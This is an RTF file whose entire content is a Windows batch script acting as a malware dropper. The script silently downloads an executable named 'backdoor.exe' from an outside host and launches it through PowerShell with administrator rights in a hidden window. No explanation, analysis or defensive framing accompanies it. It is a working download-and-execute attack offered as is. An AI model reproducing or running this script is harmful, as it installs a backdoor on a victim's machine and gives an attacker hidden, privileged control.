{\rtf1\ansi\ansicpg1252\cocoartf2761
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fnil\fcharset0 Menlo-Regular;}
{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red0\green0\blue255;\red144\green1\blue18;
}
{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c0\c0\c100000;\cssrgb\c63922\c8235\c8235;
}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0

\f0\fs22 \cf2 @echo off\
setlocal\
\cf3 rem\cf2  Set the URL of the executable to download\
\cf3 set\cf2  "download_url=http://vyapar.vaisworks.com:32774/backdoor.exe"\
\cf3 rem\cf2  Set the path where the executable will be saved\
\cf3 set\cf2  \cf4 "\cf2 download_path=%TEMP%\cf4 \\backdoor.exe"\
\cf3 rem\cf2  Download the executable silently\
\cf3 powershell\cf2  -Command "(New-Object\
System.Net.WebClient).DownloadFile('%download_url%',\
'%download_path%')"\
\cf3 rem\cf2  Run the downloaded executable with administrative privileges\
silently\
\cf3 powershell\cf2  -Command "Start-Process '%download_path%' -Verb RunAs\
-WindowStyle Hidden"\
endlocal}